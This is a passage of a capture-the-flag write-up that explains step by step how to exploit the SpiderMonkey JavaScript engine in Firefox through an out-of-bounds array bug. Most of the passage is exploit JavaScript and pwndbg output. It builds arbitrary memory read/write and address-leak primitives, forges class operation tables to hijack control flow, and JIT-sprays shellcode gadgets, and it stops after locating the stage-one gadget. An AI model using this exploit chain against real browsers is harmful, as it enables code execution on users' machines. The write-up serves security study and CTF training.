<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>js&gt; let a = new Uint32Array([1, 2, 3, 4])

pwndbg&gt; tele 0x07e2a5200698
00:0000│  0x7e2a5200698 —▸ 0x31e83964940 —▸ 0x31e8393b2b0 —▸ 0x555557664870 (js::TypedArrayObject::classes+240) —▸ 0x555555735fd4 ◂— ...
01:0008│  0x7e2a52006a0 —▸ 0x5555557672a8 (emptyObjectSlotsHeaders+8) ◂— 0x100000000
02:0010│  0x7e2a52006a8 —▸ 0x555555767280 (emptyElementsHeader+16) ◂— 0xfff9800000000000
03:0018│  0x7e2a52006b0 ◂— 0xfffa000000000000
04:0020│  0x7e2a52006b8 ◂— 0x4
05:0028│  0x7e2a52006c0 ◂— 0x0
06:0030│  0x7e2a52006c8 —▸ 0x7e2a52006d0 ◂— 0x200000001
07:0038│  0x7e2a52006d0 ◂— 0x200000001
pwndbg&gt; 
08:0040│  0x7e2a52006d8 ◂— 0x400000003
09:0048│  0x7e2a52006e0 ◂— 0x0
... ↓
</code></pre></div></div>

<p>An <code class="language-plaintext highlighter-rouge">ArrayBufferViewObject</code> has shape, objects, and elements pointers just like
a <code class="language-plaintext highlighter-rouge">NativeObject</code>. The memory that follows the elements pointers is the storage
for the TypedArray’s <em>slots</em>, which in this case contain a pointer to an
ArrayBufferObject, the length of the TypedArray, the offset into the
ArrayBufferObject, and a pointer to the TypedArray’s elements. The ArrayBuffer
and byte offset pointers aren’t really relevant for this exploit so we’ll ignore
them here. The data slot is what we really care about, and as you can see it
contains our (untagged) numbers:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; x/4wx 0x7e2a52006d0
0x7e2a52006d0:	0x00000001	0x00000002	0x00000003	0x00000004
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>

<p>Most, if not all JavaScript engine exploits follow a similar plan: gain arbitrary
read/write in the process’ address space and the use that to overwrite some
executable code with shellcode or overwrite a code pointer and start a JOP/ROP
chain. We’ll develop the exploit in the JavaScript shell and then make it work
in Firefox.</p>

<h3 id="arbitrary-rw">Arbitrary R/W</h3>

<p>So far the plan seems clear. We will use <code class="language-plaintext highlighter-rouge">Array.prototype.oob</code> to overwrite the
data pointer of a TypedArray and then use that to read and write to any address.</p>

<p>Let’s start by allocating a regular array and a TypedArray. Most (all?) JavaScript
engines allocate objects in sequence, so if we allocate the array the typed
array one after the other they should be next to each other in memory.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; tele 0x10a04c000698
00:0000│  0x10a04c000698 —▸ 0x3c159f560e20 —▸ 0x3c159f53b208 —▸ 0x555557650e10 (js::ArrayObject::class_) —▸ 0x55555574c0be ◂— ...
01:0008│  0x10a04c0006a0 —▸ 0x5555557672a8 (emptyObjectSlotsHeaders+8) ◂— 0x100000000
02:0010│  0x10a04c0006a8 —▸ 0x10a04c0006c0 ◂— 0xfff8800000000001
03:0018│  0x10a04c0006b0 ◂— 0x600000000
04:0020│  0x10a04c0006b8 ◂— 0x600000006
05:0028│  0x10a04c0006c0 ◂— 0xfff8800000000001
06:0030│  0x10a04c0006c8 ◂— 0xfff8800000000002
07:0038│  0x10a04c0006d0 ◂— 0xfff8800000000003
pwndbg&gt; 
08:0040│  0x10a04c0006d8 ◂— 0xfff8800000000004
09:0048│  0x10a04c0006e0 ◂— 0xfff8800000000005
0a:0050│  0x10a04c0006e8 ◂— 0xfff8800000000006
0b:0058│  0x10a04c0006f0 —▸ 0x7ffff53ac910 —▸ 0x7ffff53ac000 —▸ 0x7ffff653b000 —▸ 0x7ffff5343000 ◂— ...
0c:0060│  0x10a04c0006f8 —▸ 0x3c159f564860 —▸ 0x3c159f53b280 —▸ 0x555557664960 (js::TypedArrayObject::classes+480) —▸ 0x55555574f29b ◂— ...
0d:0068│  0x10a04c000700 —▸ 0x5555557672a8 (emptyObjectSlotsHeaders+8) ◂— 0x100000000
0e:0070│  0x10a04c000708 —▸ 0x555555767280 (emptyElementsHeader+16) ◂— 0xfff9800000000000
0f:0078│  0x10a04c000710 ◂— 0xfffa000000000000
pwndbg&gt; 
10:0080│  0x10a04c000718 ◂— 0x1
11:0088│  0x10a04c000720 ◂— 0x0
12:0090│  0x10a04c000728 —▸ 0x10a04c000730 ◂— 0x0
13:0098│  0x10a04c000730 ◂— 0x0
... ↓     4 skipped

pwndbg&gt; distance 0x10a04c0006c0 0x10a04c000728
0x10a04c0006c0-&gt;0x10a04c000728 is 0x68 bytes (0xd words)
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">b</code>’s data pointer is at <code class="language-plaintext highlighter-rouge">0x10a04c000728</code> and <code class="language-plaintext highlighter-rouge">a</code>’s elements are at
<code class="language-plaintext highlighter-rouge">0x10a04c0006c0</code>. This means that we can overwrite <code class="language-plaintext highlighter-rouge">b</code>’s data pointer by writing
to the 13th element with <code class="language-plaintext highlighter-rouge">oob</code>.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">converter</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">u64view</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nx">converter</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">f64view</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Float64Array</span><span class="p">(</span><span class="nx">converter</span><span class="p">);</span>

<span class="c1">// Bit-cast an uint64_t to a float64</span>
<span class="kd">function</span> <span class="nx">i2d</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">u64view</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">x</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">f64view</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>

<span class="c1">// Bit-cast a float64 to an uint64_t</span>
<span class="kd">function</span> <span class="nx">d2i</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">f64view</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">x</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">u64view</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>

<span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

<span class="nx">a</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="mi">13</span><span class="p">,</span> <span class="nx">i2d</span><span class="p">(</span><span class="mh">0x41414141</span><span class="nx">n</span><span class="p">))</span>
<span class="nx">b</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">n</span>
</code></pre></div></div>

<p>This crashes by trying to write 0 to 0x41414141, exactly like we would expect:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Thread 1 "js" received signal SIGSEGV, Segmentation fault.
0x000022760cf0b110 in ?? ()
────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────
 RAX  0x41414141
 RBX  0x7fffffffc3c8 —▸ 0xbec6100898 —▸ 0x109615e65ac0 —▸ 0x109615e3b2b0 —▸ 0x555557664960 (js::TypedArrayObject::classes+480) ◂— ...
 RCX  0x41414141
 RDX  0xfff9800000000000
 RDI  0x41414141
 RSI  0x0
 R8   0x7fffffffc798 ◂— 0xffffffffffffffff
 R9   0x7fffffffc468 ◂— 0x0
 R10  0xffff800000000000
 R11  0x7fffffffc620 ◂— 0x0
 R12  0xfffdffffffffffff
 R13  0xbec6100898 —▸ 0x109615e65ac0 —▸ 0x109615e3b2b0 —▸ 0x555557664960 (js::TypedArrayObject::classes+480) —▸ 0x55555574f29b ◂— ...
 R14  0x7fffffffc798 ◂— 0xffffffffffffffff
 R15  0x0
 RBP  0x7fffffffc390 —▸ 0x7fffffffc400 —▸ 0x7fffffffc500 —▸ 0x7fffffffc8e0 —▸ 0x7fffffffc930 ◂— ...
 RSP  0x7fffffffc358 —▸ 0x555556b2a783 ◂— jmp    0x555556b2a8e1
 RIP  0x22760cf0b110 ◂— mov    qword ptr [rdi], rsi
──────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────
 ► 0x22760cf0b110    mov    qword ptr [rdi], rsi
   0x22760cf0b113    ret 
</code></pre></div></div>

<p>We’ll encapsulate this in two utility functions, <code class="language-plaintext highlighter-rouge">read64</code> and <code class="language-plaintext highlighter-rouge">write64</code>:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Read 64 bits from addr</span>
<span class="kd">function</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">a</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="mi">13</span><span class="p">,</span> <span class="nx">i2d</span><span class="p">(</span><span class="nx">addr</span><span class="p">))</span>
    <span class="k">return</span> <span class="nx">b</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>

<span class="c1">// Write 64 bits to addr</span>
<span class="kd">function</span> <span class="nx">write64</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">a</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="mi">13</span><span class="p">,</span> <span class="nx">i2d</span><span class="p">(</span><span class="nx">addr</span><span class="p">));</span>
    <span class="nx">b</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="code-execution-take-1">Code Execution, Take 1</h3>

<p>Before I explain how my final exploit works, I’d like to discuss a technique
which I tried to use at first and which worked in the JS shell but not in Firefox.
I’m not quite sure why it didn’t work in Firefox but if you figure it out, let
me know! :)</p>

<p>When researching previous writeups for Firefox challenges I came across <a href="https://bruce30262.github.io/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/">this analysis</a>
of Saelo’s <a href="https://github.com/saelo/feuerfuchs">Feuerfuchs</a> challenge from 33c3.
As it turns out, Firefox does not have full RELRO on Linux (!), so the GOT is
writable. Moreover, the implementation of <code class="language-plaintext highlighter-rouge">TypedArray.prototype.copyWithin(0, x)</code>
calls <code class="language-plaintext highlighter-rouge">memmove</code> with the address of the TypedArray’s data buffer as the first
argument. In this situation, getting code execution is as simple as overwriting
the GOT entry of <code class="language-plaintext highlighter-rouge">memmove</code> with the address of <code class="language-plaintext highlighter-rouge">system</code>, putting our command
in a Uint8Array and calling <code class="language-plaintext highlighter-rouge">copyWithin(0, 1)</code> on it. Getting the address of
libc and the address of the GOT is trivial with arbitrary read/write: the
TypedArray’s <code class="language-plaintext highlighter-rouge">slots_</code> and <code class="language-plaintext highlighter-rouge">elements_</code>, which we can leak with <code class="language-plaintext highlighter-rouge">oob</code>, point to
static objects. Unfortunately for us for some reason even though the GOT of
<code class="language-plaintext highlighter-rouge">libxul.so</code> (the library that contains the JS engine in Firefox) is writable,
the pointer to <code class="language-plaintext highlighter-rouge">memmove</code> is not in the GOT. It’s in some other section that is
read-only, and the PLT stub for <code class="language-plaintext highlighter-rouge">memmove</code> gets the address from that section.
I spent a lot of time debugging this and trying to make it work but eventually
had to give up and search for another strategy. Such is life.</p>

<h3 id="code-execution-take-2">Code Execution, Take 2</h3>

<p>Another common technique to turn arbitrary read/write into code execution in a
JavaScript engine is to find and overwrite some executable code. On modern OSes
a memory region is normally either writable or executable, but not both at the
same time to prevent code injection attacks. However the JavaScript engines used
in modern browsers make heavy use of JIT compilation and flipping page
permissions is relatively expensive. So expensive that sometimes browser authors
would rather have memory that is both writable and executable at the same time
than pay the performance cost. This is notably the case with
<a href="https://news.ycombinator.com/item?id=18812449">WebAssembly in Chrome</a>, which
is a <a href="https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/#code-execution">well-known</a>
way to get RWX memory in the renderer process. Unfortunately, it seems that
there is no such easy bypass in Firefox. Or at least I couldn’t find one by
searching the internet, let me know if I missed something :) We are going to need
yet another approach.</p>

<h3 id="code-execution-take-3">Code Execution, Take 3</h3>

<p>At this point I went back to <a href="https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/">0vercl0k’s blog post</a>,
which has a section on how to <a href="https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/#force-the-jit-of-arbitrary-gadgets-bring-your-own-gadgets">get the JIT compiler to generate arbitrary gadgets for you</a>.
Sounds promising! The idea is to encode some machine instructions in JavaScript
floating-point constants, then get the JIT to compile your function. The compiled
machine code will contain our constants (aka our gadgets) as immediates and we
can execute them by jumping into the middle of the immediate. Cool! I even found
<a href="https://vigneshsrao.github.io/posts/writeup/#injecting-shellcode">a blog post</a>
that includes some Linux shellcode so I don’t even have to write my own ;)
This shellcode reads a pointer from <code class="language-plaintext highlighter-rouge">[rcx]</code>, changes the protection of the page
containing that address to RWX, and jumps to it.</p>

<p>All we have to do is find a way to jump to the JITed shellcode with rcx pointing
to a pointer to controlled data. Again,
0vercl0k’s blog post is very useful here, specifically <a href="https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/#hijacking-control-flow">this section</a>. In short,
every JS object type (e.g. <code class="language-plaintext highlighter-rouge">js::ArrayObject</code>) in SpiderMonkey has an associated
<code class="language-plaintext highlighter-rouge">JSClass</code> which describes the type.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; ptype /o JSClass
/* offset    |  size */  type = struct JSClass {
/*    0      |     8 */    const char *name;
/*    8      |     4 */    uint32_t flags;
/* XXX  4-byte hole  */
/*   16      |     8 */    const struct JSClassOps *cOps;
/*   24      |     8 */    const struct js::ClassSpec *spec;
/*   32      |     8 */    const struct js::ClassExtension *ext;
/*   40      |     8 */    const struct js::ObjectOps *oOps;

                           /* total size (bytes):   48 */
                         }
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">JSClass::cOps</code> points to a table of function pointers which the engine calls
when the JavaScript code does certain operations on an object that belongs to
this class, much like a C++ vtable:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; ptype /o JSClassOps
/* offset    |  size */  type = struct JSClassOps {
/*    0      |     8 */    JSAddPropertyOp addProperty;
/*    8      |     8 */    JSDeletePropertyOp delProperty;
/*   16      |     8 */    JSEnumerateOp enumerate;
/*   24      |     8 */    JSNewEnumerateOp newEnumerate;
/*   32      |     8 */    JSResolveOp resolve;
/*   40      |     8 */    JSMayResolveOp mayResolve;
/*   48      |     8 */    JSFinalizeOp finalize;
/*   56      |     8 */    JSNative call;
/*   64      |     8 */    JSHasInstanceOp hasInstance;
/*   72      |     8 */    JSNative construct;
/*   80      |     8 */    JSTraceOp trace;

                           /* total size (bytes):   88 */
                         }
pwndbg&gt; ptype JSAddPropertyOp
type = bool (*)(struct JSContext *, JS::HandleObject, JS::HandleId, JS::HandleValue)
</code></pre></div></div>

<p>For example, <code class="language-plaintext highlighter-rouge">cOps-&gt;addProperty</code> is called whenever JS code adds a new property
to the object. The fourth argument (stored in <code class="language-plaintext highlighter-rouge">rcx</code> on Linux) contains a handle
(a pointer) to the value of the new property. This is perfect because we can
completely control this value, and for example we can pass the address of a
buffer containing a second-stage shellcode. Great!</p>

<p>We cannot directly overwrite the <code class="language-plaintext highlighter-rouge">JsClassOps</code> because they are stored in read-only
memory. However we can simply follow the chain of pointers from our object to
<code class="language-plaintext highlighter-rouge">JSClassOps</code> and replace the last pointer in the chain that is in writable memory
with a pointer to a fake. Again, this is all described in 0vercl0k’s post so
I won’t bore you with the details.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Return the address of a JavaScript object</span>
<span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">a</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span> <span class="nx">x</span><span class="p">);</span>
    <span class="k">return</span> <span class="nx">b</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffff</span><span class="nx">n</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">const</span> <span class="nx">addrof_target</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">target</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">target_shape</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">addrof_target</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">target_base_shape</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">target_shape</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">target_class</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">target_base_shape</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">target_ops</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">target_class</span> <span class="o">+</span> <span class="mh">0x10</span><span class="nx">n</span><span class="p">);</span>
<span class="nx">print</span><span class="p">(</span><span class="s2">`addrof(target) = </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">addrof_target</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
<span class="nx">print</span><span class="p">(</span><span class="s2">`target-&gt;shape = </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">target_shape</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
<span class="nx">print</span><span class="p">(</span><span class="s2">`target-&gt;shape-&gt;base_shape = </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">target_base_shape</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
<span class="nx">print</span><span class="p">(</span><span class="s2">`target-&gt;shape-&gt;base_shape-&gt;class = </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">target_class</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
<span class="nx">print</span><span class="p">(</span><span class="s2">`target-&gt;shape-&gt;base_shape-&gt;class-&gt;ops = </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">target_ops</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">fake_class</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="mi">48</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">fake_class_buffer</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">fake_class</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x30</span><span class="nx">n</span><span class="p">);</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">fake_class</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">target_class</span> <span class="o">+</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="nx">n</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">const</span> <span class="nx">fake_ops</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="mi">88</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">fake_ops_buffer</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">fake_ops</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x30</span><span class="nx">n</span><span class="p">);</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">11</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">fake_ops</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">target_ops</span> <span class="o">+</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="nx">n</span><span class="p">);</span>
<span class="p">}</span>

<span class="nx">fake_ops</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">stage1_addr</span><span class="p">;</span>
<span class="nx">fake_class</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">fake_ops_buffer</span><span class="p">;</span>
<span class="nx">write64</span><span class="p">(</span><span class="nx">target_base_shape</span><span class="p">,</span> <span class="nx">fake_class_buffer</span><span class="p">);</span>

<span class="nx">target</span><span class="p">.</span><span class="nx">someprop</span> <span class="o">=</span> <span class="nx">i2d</span><span class="p">(</span><span class="nx">shellcode_addr</span><span class="p">);</span>
</code></pre></div></div>

<p>Now all that we have to do is to get the JIT to compile our code and find it in
memory. The first part is easy, simply put it in a function and call it many times
in a loop until the JIT decides that the function is hot and compiles it:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">jitme</span> <span class="p">()</span> <span class="p">{</span>
    <span class="c1">// ...</span>
<span class="p">}</span>

<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">jitme</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The second part is a bit more tricky. JavaScript functions are represented by a
JSFunction, and we can find the region containing the compiled code for that
function by following pointers, like this (pointers to executable memory are
highlighted in red):</p>

<p><img src="/corCTF-2021/pwn/outfoxed1.png" alt="" /></p>

<p>We can get the address of the function by storing it into our TypedArray with
<code class="language-plaintext highlighter-rouge">oob</code> and then reading the address back, then follow the pointers until the
code pointer. However the code pointer doesn’t exactly point to the beginning
of the function, but rather to some other place in the same page. The author of
the writeup that I got the shellcode from solves this by embedding a magic
number in the shellcode and then searching for it using the arbitrary read/write.
We’ll do the same.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Read size bytes from addr</span>
<span class="kd">function</span> <span class="nx">read</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">assert</span><span class="p">(</span><span class="nx">size</span> <span class="o">%</span> <span class="mi">8</span><span class="nx">n</span> <span class="o">===</span> <span class="mi">0</span><span class="nx">n</span><span class="p">);</span>
    <span class="kd">let</span> <span class="nx">ret</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nb">Number</span><span class="p">(</span><span class="nx">size</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">n</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">size</span> <span class="o">/</span> <span class="mi">8</span><span class="nx">n</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">ret</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">addr</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">*</span> <span class="mi">8</span><span class="nx">n</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">ret</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">const</span> <span class="nx">addrof_jitme</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">jitme</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">codepage_addr</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">read64</span><span class="p">(</span><span class="nx">addrof_jitme</span> <span class="o">+</span> <span class="mh">0x28</span><span class="nx">n</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffff000</span><span class="nx">n</span><span class="p">;</span>
<span class="nx">print</span><span class="p">(</span><span class="s2">`addrof(jitme) = </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">addrof_jitme</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
<span class="nx">print</span><span class="p">(</span><span class="s2">`code page at = </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">codepage_addr</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nx">codepage_addr</span><span class="p">,</span> <span class="mh">0x1000</span><span class="nx">n</span><span class="p">);</span>

<span class="kd">let</span> <span class="nx">stage1_offset</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span> <span class="o">-</span> <span class="mi">8</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">code</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x37</span> <span class="o">&amp;&amp;</span> <span class="nx">code</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x13</span> <span class="o">&amp;&amp;</span> <span class="nx">code</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x37</span>
        <span class="o">&amp;&amp;</span> <span class="nx">code</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x13</span> <span class="o">&amp;&amp;</span> <span class="nx">code</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x37</span> <span class="o">&amp;&amp;</span> <span class="nx">code</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x13</span>
        <span class="o">&amp;&amp;</span> <span class="nx">code</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">6</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x37</span> <span class="o">&amp;&amp;</span> <span class="nx">code</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">7</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x13</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">stage1_offset</span> <span class="o">=</span> <span class="nx">i</span> <span class="o">+</span> <span class="mi">14</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">assert</span><span class="p">(</span><span class="nx">stage1_offset</span> <span class="o">!==</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">stage1_addr</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">stage1_offset</span><span class="p">)</span> <span class="o">+</span> <span class="nx">codepage_addr</span><span class="p">;</span>
